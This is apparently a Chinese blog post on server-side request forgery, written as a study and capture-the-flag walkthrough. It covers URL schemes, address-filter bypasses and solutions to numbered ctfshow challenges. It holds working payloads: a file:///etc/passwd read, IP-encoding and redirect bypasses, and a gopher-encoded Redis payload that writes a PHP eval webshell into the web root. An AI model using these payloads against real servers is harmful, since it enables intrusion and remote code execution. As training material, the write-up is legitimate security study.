+<p><font style="background-color:rgba(255, 255, 255, 0);">tftp:&#x2F;&#x2F; 简单文件传输协议</font></p>
+<p><font style="background-color:rgba(255, 255, 255, 0);">gopher:&#x2F;&#x2F; 分布式文档传递服务，可使用gopherus生成payload</font></p>
+<p><font style="background-color:rgba(255, 255, 255, 0);">由于有部分协议http这类不支持，可以gopher来进行通讯（mysql，redis等）</font></p>
+<p><font style="background-color:rgba(255, 255, 255, 0);">应用：漏洞利用 或 信息收集 通讯相关服务的时候 工具：Gopherus</font></p>
+<h2 id="http-（常用）"><a href="#http-（常用）" class="headerlink" title="http:&#x2F;&#x2F; （常用）"></a><font style="background-color:rgba(255, 255, 255, 0);">http:&#x2F;&#x2F; （常用）</font></h2><p><font style="background-color:rgba(255, 255, 255, 0);">Web常见访问，如<a target="_blank" rel="noopener" href="http://127.0.0.1、http//127.0.0.1:8080%E3%80%81http://192.168.1.1%E3%80%81http://192.168.1.2%E7%AD%89">http://127.0.0.1、http://127.0.0.1:8080、http://192.168.1.1、http://192.168.1.2等</a></font></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733586729203-2be143ec-88b3-4a31-9e70-9d5225f7f61d.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733586728962-c4e36ea9-dc1f-40d1-a938-8271a5669ac1.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733586728928-a83b3f68-d16e-4c94-86e5-101ba4b449f9.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733586728983-76763995-2721-47f9-a42d-d9da9b9025df.png"></p>
+<h2 id="file-（常用）"><a href="#file-（常用）" class="headerlink" title="file:&#x2F;&#x2F;&#x2F; （常用）"></a>file:&#x2F;&#x2F;&#x2F; （常用）</h2><p>从文件系统中获取文件内容，如，file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd、file:&#x2F;&#x2F;&#x2F;D:&#x2F;1.txt</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733586768939-08145aae-8eec-4bc3-a8c2-33724f5d1fc1.png"></p>
+<h2 id="dict-（常用）"><a href="#dict-（常用）" class="headerlink" title="dict:&#x2F;&#x2F; （常用）"></a>dict:&#x2F;&#x2F; （常用）</h2><p>字典服务器协议，访问字典资源，如，dict:&#x2F;&#x2F;&#x2F;ip:6379&#x2F;info</p>
+<h2 id="sftp"><a href="#sftp" class="headerlink" title="sftp:&#x2F;&#x2F;"></a>sftp:&#x2F;&#x2F;</h2><p>SSH文件传输协议或安全文件传输协议</p>
+<h2 id="ldap"><a href="#ldap" class="headerlink" title="ldap:&#x2F;&#x2F;"></a>ldap:&#x2F;&#x2F;</h2><p>轻量级目录访问协议</p>
+<h2 id="tftp"><a href="#tftp" class="headerlink" title="tftp:&#x2F;&#x2F;"></a>tftp:&#x2F;&#x2F;</h2><p>简单文件传输协议</p>
+<h2 id="gopher-（常用）"><a href="#gopher-（常用）" class="headerlink" title="gopher:&#x2F;&#x2F; （常用）"></a>gopher:&#x2F;&#x2F; （常用）</h2><p>分布式文档传递服务，可使用gopherus生成payload（gopherus要使用python2）<br>有部分服务是http协议不支持通讯的，那么可以用gopher来进行通讯（如mysql，redis服务等）<br>应用：漏洞利用 或 信息收集 通讯相关服务的时候 工具：Gopherus</p>
+<h1 id="SSRF绕过方式"><a href="#SSRF绕过方式" class="headerlink" title="SSRF绕过方式"></a>SSRF绕过方式</h1><p>情况1：限制为<a target="_blank" rel="noopener" href="http://www.xxx.com/">http://www.xxx.com</a> 域名</font></p>
+<p>采用http基本身份认证的方式绕过，即@</font></p>
+<p><a target="_blank" rel="noopener" href="http://www.xxx.com@www.xxyy.com/">http://www.xxx.com@www.xxyy.com</a></font></p>
+</font>
+
+<p>情况2：限制请求IP不为内网地址</font></p>
+<p>当不允许ip为内网地址时：</font></p>
+<p>（1）采取短网址绕过</p>
+<p>（2）采取域名解析</p>
+<p>（3）采取进制转换</font></p>
+<p>（4）采取3XX重定向</font></p>
+<h1 id="白盒CTF-绕过-伪协议-审计点"><a href="#白盒CTF-绕过-伪协议-审计点" class="headerlink" title="白盒CTF-绕过&amp;伪协议&amp;审计点"></a>白盒CTF-绕过&amp;伪协议&amp;审计点</h1><h2 id="351-无过滤"><a href="#351-无过滤" class="headerlink" title="351-无过滤"></a>351-无过滤</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733732705456-8a2e9684-746a-46d6-b8cf-bfde84e44842.png"></p>
+<p>分析：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);<span class="comment">//报错不显示</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);<span class="comment">//高亮</span></span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];<span class="comment">//POST传参url</span></span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);<span class="comment">//curl_init 初始化一个 cURL 会话，并设置目标 URL 为 $url</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);<span class="comment">//设置 cURL 选项，表示请求返回的数据中不包含头部信息。</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);<span class="comment">//设置 cURL 选项，表示将请求结果返回为字符串，而不是直接输出。</span></span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);<span class="comment">//执行 cURL 请求并将返回内容存储到 $result</span></span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);<span class="comment">//关闭cUrl</span></span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>没有任何过滤，直接尝试获取本地文件</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733733935041-e9a6ef90-dde4-4be7-bbf5-98f63c49f4d8.png"></p>
+<h2 id="352-353-ip地址过滤（IP地址进制转换）"><a href="#352-353-ip地址过滤（IP地址进制转换）" class="headerlink" title="352-353-ip地址过滤（IP地址进制转换）"></a>352-353-ip地址过滤（IP地址进制转换）</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733734663161-e4bfb490-8aa7-4c45-872e-85768d8054c6.png"></p>
+<p>要求地址中必须含有http或https，且不能含有localhost和127.0.0</p>
+<p>绕过：</p>
+<p>ip地址进制转换</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733734829549-047404f2-14b2-4976-a200-c7193dd75a7d.png"></p>
+<p>十六进制和十进制都可以（十六进制前要加0x）</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733734876905-9a2748a2-3e93-48f2-b6e8-b295603c5534.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733734903408-307ad7c1-b7c5-4c5b-b561-3d08f1436eac.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733735079009-625e819b-f786-4128-9b16-6ac3540c6cd5.png"></p>
+<p>还有一种特殊的省略模式</p>
+<p>127.0.0.1写成127.1</p>
+<p>用CIDR绕过localhost</p>
+<p>url&#x3D;<a target="_blank" rel="noopener" href="http://127.127.127.127/flag.php">http://127.127.127.127/flag.php</a></p>
+<p>还有很多方式</p>
+<p>url&#x3D;<a target="_blank" rel="noopener" href="http://0.0.0.0/flag.php">http://0/flag.php</a></p>
+<p>url&#x3D;<a target="_blank" rel="noopener" href="http://0.0.0.0/flag.php">http://0.0.0.0/flag.php</a></p>
+<h2 id="354-域名解析ip绕过"><a href="#354-域名解析ip绕过" class="headerlink" title="354-域名解析ip绕过"></a>354-域名解析ip绕过</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733735574901-947b002f-a897-430f-a6e1-691e5523a514.png"></p>
+<p>localhost 1 0 都被过滤</p>
+<p>域名解析ip绕过</p>
+<p>配置一个域名解析为127.0.0.1</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733735704044-8cfca0cc-b7b0-4b10-918c-baf59cf84438.png"></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">url=http:<span class="comment">//test.hhhan.club/flag.php</span></span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733735815220-b93fcd9d-bab2-40d0-bcb2-3662b817666d.png"></p>
+<h2 id="355-356-长度限制IP绕过"><a href="#355-356-长度限制IP绕过" class="headerlink" title="355-356-长度限制IP绕过"></a>355-356-长度限制IP绕过</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733735995217-2e6d0b19-1515-495b-9690-058237c86b0b.png"></p>
+<p>对于输入的ip地址有长度限制，要&lt;&#x3D;5</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733736141096-d48b2fc4-7bd1-4f33-8a7f-c71a55cf79c7.png"></p>
+<blockquote>
+<p>356为长度&lt;&#x3D;3，payload：url&#x3D;<a target="_blank" rel="noopener" href="http://0.0.0.0/flag.php">http://0/flag.php</a></p>
+</blockquote>
+<h2 id="357-重定向解析绕过"><a href="#357-重定向解析绕过" class="headerlink" title="357-重定向解析绕过"></a>357-重定向解析绕过</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733736698143-f77efed2-1b39-41a0-8672-896d11ec1fb0.png"></p>
+<p>如果输入的域名解析结果为127.0.0.1，就会被过滤</p>
+<p>重定向绕过</p>
+<p>在VPS下创建一个文件</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:http://127.0.0.1/flag.php&quot;</span>); </span><br><span class="line">其作用是：当执行该脚本时，会直接跳转到对应的网址，即Location: 后面的网址。</span><br></pre></td></tr></table></figure>
+
+<p>再去访问这个文件</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733737890099-6067ff6a-4702-4e2c-a81f-ccbced7480e2.png"></p>
+<h2 id="358-匹配但不影响写法绕过"><a href="#358-匹配但不影响写法绕过" class="headerlink" title="358-匹配但不影响写法绕过"></a>358-匹配但不影响写法绕过</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733737999490-4c9598f7-570e-450a-b8cb-ceeb07a8f236.png"></p>
+<p>url中必须包含http: &#x2F; ctf show 字样，url的内容才会被执行输出</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">url=http:<span class="comment">//ctf.@127.0.0.1/flag.php#show</span></span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733738148952-e4e51a47-b786-4eb9-9c3c-ccefd0054343.png"></p>
+<blockquote>
+<p>#注释掉后面的内容</p>
+<p>ctf.@对url没有影响</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733738449498-e95a42bf-1d34-4118-90b8-fc2bac68312b.png"></p>
+</blockquote>
+<h2 id="gopher协议打"><a href="#gopher协议打" class="headerlink" title="gopher协议打"></a>gopher协议打</h2><h3 id="359-mysql"><a href="#359-mysql" class="headerlink" title="359-mysql"></a>359-mysql</h3><p>前提条件是无密码的mysql</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733738642143-96ed85e3-8193-4c69-864b-f5c983ffcad0.png"></p>
+<p>登录的数据包：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733740084278-fc76ab9f-29ea-446b-b876-f8a6f6f6e329.png"></p>
+<p>使用gopherus生成payload</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733739731500-5d88dd4d-0527-4331-9407-737e2e021471.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733739923803-c93b67d7-9e77-44a6-8b0b-a40ff211bce7.png"></p>
+<p>将payload在进行一次url编码</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733740408774-0ef89d40-db61-4d29-ae90-81dc21b6ddce.png"></p>
+<p>发送</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733740431151-909a1e9b-76d3-4810-b1f6-54206fec5ce0.png"></p>
+<p>访问x.php，木马被写入</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733740445491-ee4bbd84-a295-4c4a-b489-886f5da54d3b.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733740496292-3145ea96-cc88-4bf8-951c-a29636f82bf9.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733740521737-b63c59fd-0c00-4c7e-b34e-3c24b42bddc0.png"></p>
+<h3 id="360-redis"><a href="#360-redis" class="headerlink" title="360-redis"></a>360-redis</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733740561458-72722c90-b2cc-45b2-8d6d-e5e65d78890a.png"></p>
+<p>使用gopherus</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733740900865-b965f5f0-5b21-484c-b9ad-5f6dec7bb7d3.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733741341457-c0e9a219-92e7-4818-b593-ce54390625c2.png"></p>
+<p>生成的文件为当前目录下的shell.php</p>
+<p>同样，gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_后面的内容也要进行url编码</p>
+<p>payload：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">post：url=gopher:<span class="comment">//127.0.0.1:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252433%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255B%2527pass%2527%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A</span></span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733741295364-8ea79fad-d64a-4b67-a346-82bc52e89d41.png"></p>
+<p>命令执行</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733741399346-bd7517ed-7a51-4b39-b257-7c424e39d9b2.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733741413398-e6d94eb9-fdac-4c3a-937b-fde0a4db3e5d.png"></p>
+<h1 id="黑盒WEB-业务功能-URL关键字"><a href="#黑盒WEB-业务功能-URL关键字" class="headerlink" title="黑盒WEB-业务功能&amp;URL关键字"></a>黑盒WEB-业务功能&amp;URL关键字</h1><p>黑盒探针：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733741501763-f92fc712-30e4-4fd8-a4db-6060f7c89beb.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733741501958-3747910f-12b3-4fba-bc61-12ea7559496a.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733741501727-56dfa9a0-87f9-4131-a73f-0b36bc6ec375.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733741501970-9d035e46-9c70-427b-9226-6d8c10a0d97e.png"></p>
+<p>SRC(文件导出&#x2F;格式转换 SSRF)</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733741501928-e6f5aacc-a8f3-41a0-8a35-1b04c59efd49.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733741502287-087ef846-85c1-49a1-8bfe-6308b3199bbd.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733741502337-9ae4caab-8313-4b6d-8a8d-9b7311c2f68e.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733741502625-4b9eb08f-1a50-476d-acf6-5c8ff35d93c2.png"></p>
+<p>iframe 标签</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=&quot;http://6p5vvu.dnslog.cn&quot;&gt;</span><br><span class="line">&lt;iframe src=&quot;6p5vvu.dnslog.cn&quot;&gt;</span><br><span class="line">&lt;iframe&gt;标签是干嘛的？</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733741502616-f81c6bd9-abcc-491d-ab8c-222771adbcc4.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733741502571-b84b0a8d-a7ec-4fff-be46-f9ea890262d2.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733741502785-3676884c-31fd-4fc2-bf31-369bf754dbca.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733741502989-369031a1-f5f1-470f-ba26-4c71fafa480c.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733741503193-3b4a236c-fc36-4607-baae-f9ee17771e77.png"></p>
+<p>SSRF和文件包含黑盒如何区分？</p>
+<p>1.分析参数关键字(url字样大概率SSRF，file字样大概率文件包含)<br>2.看参数值地址(文件包含一般只允许包含本地，看能不能包含远程地址)<br>3.分析页面响应</p>
+<p>多方面多角度分析</p>
+</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">Attackxu</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://example.com/2025/05/27/SSRF/">原创</a><a class="post-copyright-title"><span 